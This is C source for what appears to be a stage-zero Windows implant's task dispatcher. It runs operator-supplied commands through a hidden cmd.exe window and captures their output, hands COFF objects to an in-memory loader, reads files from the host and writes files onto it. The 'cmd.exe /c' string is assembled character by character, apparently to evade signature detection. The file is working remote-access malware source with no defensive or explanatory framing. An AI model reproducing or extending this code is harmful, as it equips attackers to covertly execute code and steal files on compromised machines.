#include "stage0.h"

static s0_coff_loader_fn g_coff_loader;

void s0_set_coff_loader(s0_coff_loader_fn loader) { g_coff_loader = loader; }

static int s0_read_file(const wchar_t *path, s0_buffer *out) {
    HANDLE f; DWORD size, got = 0;
    f = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL, 0);
    if (f == INVALID_HANDLE_VALUE) return 0;
    size = GetFileSize(f, 0);
    if (size == INVALID_FILE_SIZE || size > S0_MAX_FRAME ||
        !s0_buffer_reserve(out, size)) { CloseHandle(f); return 0; }
    if (!ReadFile(f, out->data, size, &got, 0)) got = 0;
    CloseHandle(f); out->length = got;
    return got == size;
}

static int s0_write_file(const wchar_t *path, const uint8_t *data, uint32_t len) {
    HANDLE f; DWORD wrote = 0;
    f = CreateFileW(path, GENERIC_WRITE, 0, 0, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, 0);
    if (f == INVALID_HANDLE_VALUE) return 0;
    WriteFile(f, data, len, &wrote, 0); CloseHandle(f);
    return wrote == len;
}

static int s0_exec(const wchar_t *cmd, s0_buffer *out) {
    SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, TRUE};
    STARTUPINFOW si = {0}; PROCESS_INFORMATION pi = {0};
    HANDLE rd = 0, wr = 0; DWORD got;
    wchar_t *line; size_t chars;
    size_t cmd_chars = 0;
    while (cmd_chars < (S0_MAX_FRAME / sizeof(wchar_t)) && cmd[cmd_chars])
        ++cmd_chars;
    if (cmd_chars == S0_MAX_FRAME / sizeof(wchar_t)) return 0;
    chars = cmd_chars + 16;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return 0;
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);
    line = HeapAlloc(GetProcessHeap(), 0, chars * sizeof(wchar_t));
    if (!line) { CloseHandle(rd); CloseHandle(wr); return 0; }
    line[0] = L'c'; line[1] = L'm'; line[2] = L'd'; line[3] = L'.';
    line[4] = L'e'; line[5] = L'x'; line[6] = L'e'; line[7] = L' ';
    line[8] = L'/'; line[9] = L'c'; line[10] = L' ';
    lstrcpyW(line + 11, cmd);
    si.cb = sizeof(si); si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; si.hStdOutput = wr; si.hStdError = wr;
    if (!CreateProcessW(0, line, 0, 0, TRUE, CREATE_NO_WINDOW, 0, 0, &si, &pi)) {
        HeapFree(GetProcessHeap(), 0, line); CloseHandle(rd); CloseHandle(wr);
        return 0;
    }
    HeapFree(GetProcessHeap(), 0, line); CloseHandle(wr);
    while (s0_buffer_reserve(out, out->length + 4096) &&
           ReadFile(rd, out->data + out->length, 4096, &got, 0) && got)
        out->length += got;
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(rd);
    return 1;
}

int s0_dispatch_task(const uint8_t *task, uint32_t task_len, s0_buffer *result) {
    uint8_t op; uint32_t path_bytes;
    const wchar_t *path;
    if (!task || task_len < 1 || !result) return 0;
    op = task[0]; task++; task_len--;
    if (op == S0_TASK_EXEC) {
        if (task_len < sizeof(wchar_t) || (task_len & 1) ||
            *(const wchar_t *)(task + task_len - sizeof(wchar_t)) != L'\0')
            return 0;
        return s0_exec((const wchar_t *)task, result);
    }
    if (op == S0_TASK_COFF) {
        uint32_t object_len;
        if (!g_coff_loader || task_len < 4) return 0;
        object_len = *(const uint32_t *)task; task += 4; task_len -= 4;
        if (!object_len || object_len > task_len) return 0;
        return g_coff_loader(task, object_len, task + object_len,
                             task_len - object_len, result);
    }
    if (task_len < 4) return 0;
    path_bytes = *(const uint32_t *)task; task += 4; task_len -= 4;
    if (path_bytes < sizeof(wchar_t) || path_bytes > task_len ||
        (path_bytes & 1) ||
        *(const wchar_t *)(task + path_bytes - sizeof(wchar_t)) != L'\0')
        return 0;
    path = (const wchar_t *)task;
    task += path_bytes; task_len -= path_bytes;
    if (op == S0_TASK_DOWNLOAD) return s0_read_file(path, result);
    if (op == S0_TASK_UPLOAD) return s0_write_file(path, task, task_len);
    return 0;
}
